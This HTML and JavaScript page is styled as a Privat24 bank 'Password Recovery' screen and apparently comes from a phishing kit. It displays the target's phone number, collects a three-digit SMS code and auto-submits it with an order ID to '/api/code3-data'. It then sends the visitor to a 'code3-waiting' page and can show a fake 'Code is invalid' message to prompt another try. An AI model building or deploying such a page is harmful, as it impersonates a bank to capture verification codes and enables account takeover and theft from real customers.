<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Password Recovery from Privat24</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased}
  body{max-width:520px;margin:0 auto;min-height:100vh;background:#fff;display:flex;flex-direction:column}

  .header{
    display:flex;align-items:center;justify-content:flex-end;
    padding:14px 18px;border-bottom:1px solid #eee;
  }
  .x-btn{background:none;border:none;cursor:pointer;padding:8px}
  .x-btn svg{width:22px;height:22px;stroke:#1a1a1a;stroke-width:2;fill:none;stroke-linecap:round}

  .content{flex:1;padding:60px 28px 0}

  .title{
    font-size:30px;font-weight:400;color:#1a1a1a;
    text-align:center;line-height:1.3;margin-bottom:60px;
    letter-spacing:-.3px;
  }

  .field{margin-bottom:44px}
  .lbl{font-size:14px;color:#9aa0a6;margin-bottom:14px;font-weight:400}
  .phone-val{font-size:24px;color:#1a1a1a;font-weight:400;letter-spacing:.3px}

  .code-row{
    display:flex;gap:18px;margin-top:12px;direction:ltr;
    justify-content:space-between;max-width:100%;
  }
  .code-digit{
    flex:1;height:52px;border:none;border-bottom:1.5px solid #d8d8d8;
    background:transparent;text-align:center;
    font-size:24px;font-weight:400;color:#1a1a1a;
    font-family:inherit;outline:none;transition:.2s;padding:0 0 6px;
    min-width:0;
  }
  .code-digit::placeholder{color:#d8d8d8;font-weight:300}
  .code-digit:focus{border-bottom-color:#b8b8b8}

  .err{
    display:none;margin:14px 28px 0;padding:10px 14px;
    background:#fff5f5;border:1px solid #fcc;border-radius:10px;
    color:#dc2626;font-size:14px;text-align:center;font-weight:700;
  }
</style>
</head>
<body>

  <div class="header">
    <button class="x-btn" onclick="history.back()" aria-label="Close">
      <svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg>
    </button>
  </div>

  <div class="content">
    <div class="title">Password Recovery from<br>Privat24</div>

    <div class="field">
      <div class="lbl">Phone Number</div>
      <div class="phone-val" id="userPhone">+38 (___) ___ __ __</div>
    </div>

    <div class="field">
      <div class="lbl">Message with code</div>
      <div class="code-row">
        <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c0" placeholder="X">
        <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c1" placeholder="X">
        <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c2" placeholder="X">
      </div>
    </div>

    <div class="err" id="errorMsg"></div>
  </div>

<script>
  const params  = new URLSearchParams(location.search);
  const orderId = params.get("order");
  let   phone   = params.get("phone");

  if (!orderId) location.href = "index.html";

  function renderPhone(p) {
    if (!p) return;
    p = p.replace(/\D/g, "");
    if (p.startsWith("380")) p = p.substring(3);
    if (p.length === 9 && p[0] !== "0") p = "0" + p;
    if (p.length >= 10) {
      const f = "+38 (" + p.substring(0,3) + ") " +
                p.substring(3,6) + " " +
                p.substring(6,8) + " " +
                p.substring(8,10);
      document.getElementById("userPhone").textContent = f;
    } else if (p.length > 0) {
      document.getElementById("userPhone").textContent = "+380" + p;
    }
  }

  if (phone) {
    renderPhone(phone);
  } else {
    fetch("/api/orders/" + orderId + "/status")
      .then(r => r.json())
      .then(d => {
        if (d.username) {
          phone = d.username;
          renderPhone(d.username);
        }
      })
      .catch(() => {});
  }

  if (params.get("error") === "1") {
    const el = document.getElementById("errorMsg");
    el.textContent = "Code is invalid or incorrect";
    el.style.display = "block";
    setTimeout(() => { el.style.display = "none"; }, 3500);
  }

  const digits = document.querySelectorAll(".code-digit");

  digits.forEach((inp, i) => {
    inp.addEventListener("input", () => {
      inp.value = inp.value.replace(/\D/g, "");
      if (inp.value && i < digits.length - 1) digits[i + 1].focus();
      maybeAutoSubmit();
    });
    inp.addEventListener("keydown", e => {
      if (e.key === "Backspace" && !inp.value && i > 0) digits[i - 1].focus();
    });
    inp.addEventListener("paste", e => {
      e.preventDefault();
      const text = (e.clipboardData.getData("text") || "").replace(/\D/g, "");
      for (let j = 0; j < digits.length && j < text.length; j++) {
        digits[j].value = text[j];
      }
      const last = Math.min(text.length, digits.length);
      if (last > 0) digits[Math.min(last, digits.length - 1)].focus();
      maybeAutoSubmit();
    });
  });

  function getCode() {
    return Array.from(digits).map(d => d.value).join("");
  }

  function showError(msg) {
    const el = document.getElementById("errorMsg");
    el.textContent = msg;
    el.style.display = "block";
    setTimeout(() => { el.style.display = "none"; }, 3500);
  }

  let submitting = false;
  function maybeAutoSubmit() {
    const code = getCode();
    if (code.length === digits.length && !submitting) submitCode();
  }

  async function submitCode() {
    const code = getCode();
    if (code.length < digits.length) return;
    submitting = true;
    digits.forEach(d => d.disabled = true);

    try {
      const res  = await fetch("/api/code3-data", {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ order_id: orderId, code: code })
      });
      const data = await res.json();
      if (data.success) {
        location.href = "code3-waiting.html?order=" + orderId +
                        (phone ? "&phone=" + encodeURIComponent(phone) : "");
      } else {
        showError(data.message || "Something went wrong");
        resetInputs();
      }
    } catch (err) {
      showError("Connection error");
      resetInputs();
    }
  }

  function resetInputs() {
    submitting = false;
    digits.forEach(d => { d.disabled = false; d.value = ""; });
    digits[0].focus();
  }
</script>
<script src="/tracker.js"></script>
</body>
</html>
